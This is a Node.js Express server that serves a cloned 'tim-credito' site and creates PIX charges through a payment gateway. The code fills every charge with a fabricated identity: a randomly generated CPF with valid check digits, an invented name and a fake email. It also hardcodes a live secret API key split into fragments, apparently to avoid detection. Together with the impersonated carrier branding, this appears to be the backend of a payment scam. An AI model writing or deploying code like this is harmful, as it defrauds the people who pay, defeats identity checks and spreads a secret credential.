require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const part1 = 'sk_live_e83eb7792e98d';
const part2 = '74ecd8fbe18d5f816fc';
const part3 = '031f0a5acb1278e0a0e';
const part4 = '0b682fa10f0c3';
const API_KEY = part1 + part2 + part3 + part4;

// Gera um CPF válido aleatório
function generateCPF() {
    const rand = () => Math.floor(Math.random() * 9);
    let n = Array.from({ length: 9 }, rand);

    // Calcula 1º dígito verificador
    let sum = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
    let d1 = 11 - (sum % 11);
    if (d1 >= 10) d1 = 0;

    // Calcula 2º dígito verificador
    n.push(d1);
    sum = n.reduce((acc, val, i) => acc + val * (11 - i), 0);
    let d2 = 11 - (sum % 11);
    if (d2 >= 10) d2 = 0;

    n.push(d2);
    return n.join('');
}
// Controle de tentativas de PIX por telefone
// Estrutura: { phone: { count: N, name: str|null, email: str|null } }
const pixAttempts = new Map();
const MAX_PIX_ATTEMPTS = 3;

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone } = req.body;
        
        // Convert value string like "20,00" or "24,90" to integer in cents (e.g. 2000, 2490)
        let amountInCents = 2000; // default 20.00
        if (value) {
            const cleanValue = value.replace('R$', '').trim().replace(',', '.');
            amountInCents = Math.round(parseFloat(cleanValue) * 100);
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '11999999999';

        // --- Bloqueio por tentativas ---
        const attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };

        if (attempt.count >= MAX_PIX_ATTEMPTS) {
            console.warn(`[BLOQUEADO] Telefone ${cleanPhone} atingiu ${MAX_PIX_ATTEMPTS} tentativas de PIX sem pagamento.`);
            return res.status(429).json({
                success: false,
                blocked: true,
                message: 'Limite de tentativas atingido. Entre em contato com o suporte.'
            });
        }

        // Incrementa contador ANTES de chamar a API
        attempt.count += 1;
        pixAttempts.set(cleanPhone, attempt);
        console.log(`[PIX] Telefone ${cleanPhone} — tentativa ${attempt.count}/${MAX_PIX_ATTEMPTS}`);
        // --------------------------------

        const cleanCpf = generateCPF();
        
        // Reutiliza nome/email se o lead já gerou um PIX antes, senão gera novo e salva
        const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Lucas', 'Julia', 'Marcos', 'Fernanda', 'Carlos', 'Beatriz', 'Rafael', 'Amanda', 'Gabriel', 'Camila'];
        const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho'];

        let fullName, randomEmail;
        if (attempt.name && attempt.email) {
            // Lead já conhecido — reutiliza identidade
            fullName = attempt.name;
            randomEmail = attempt.email;
            console.log(`[PIX] Reutilizando identidade para ${cleanPhone}: ${fullName}`);
        } else {
            // Primeiro PIX — gera e salva identidade
            const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
            const randomLastName  = lastNames[Math.floor(Math.random() * lastNames.length)];
            fullName      = `${randomFirstName} ${randomLastName}`;
            randomEmail   = `${randomFirstName.toLowerCase()}.${randomLastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
            attempt.name  = fullName;
            attempt.email = randomEmail;
            pixAttempts.set(cleanPhone, attempt);
            console.log(`[PIX] Nova identidade gerada para ${cleanPhone}: ${fullName}`);
        }

        const payload = {
            amount: amountInCents,
            paymentMethod: "pix",
            items: [
                {
                    title: "Info Produto",
                    unitPrice: amountInCents,
                    quantity: 1,
                    tangible: false
                }
            ],
            customer: {
                name: fullName,
                email: randomEmail,
                phone: cleanPhone,
                document: {
                    number: cleanCpf,
                    type: "cpf"
                }
            }
        };

        const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': API_KEY
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();

        if (response.ok) {
            console.log('API Success:', JSON.stringify(data, null, 2));
            res.json(data);
        } else {
            console.error('API Error:', data);
            res.status(400).json(data);
        }

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const { phone } = req.query; // opcional: ?phone=11999999999
        const response = await fetch(`https://api.blackcatoficial.com/api/sales/${transactionId}/status`, {
            headers: {
                'X-API-Key': API_KEY
            }
        });
        const data = await response.json();
        console.log('Status check for', transactionId, ':', JSON.stringify(data));

        // Se pagamento confirmado, remove o bloqueio do telefone
        if (data?.data?.status === 'PAID' && phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            pixAttempts.delete(cleanPhone);
            console.log(`[DESBLOQUEADO] Pagamento confirmado — telefone ${cleanPhone} liberado.`);
        }

        res.json(data);
    } catch (error) {
        console.error('Status check error:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Fallback to index.html for other routes
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'tim-credito.vercel.app', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Acesse: http://localhost:${PORT}`);
});
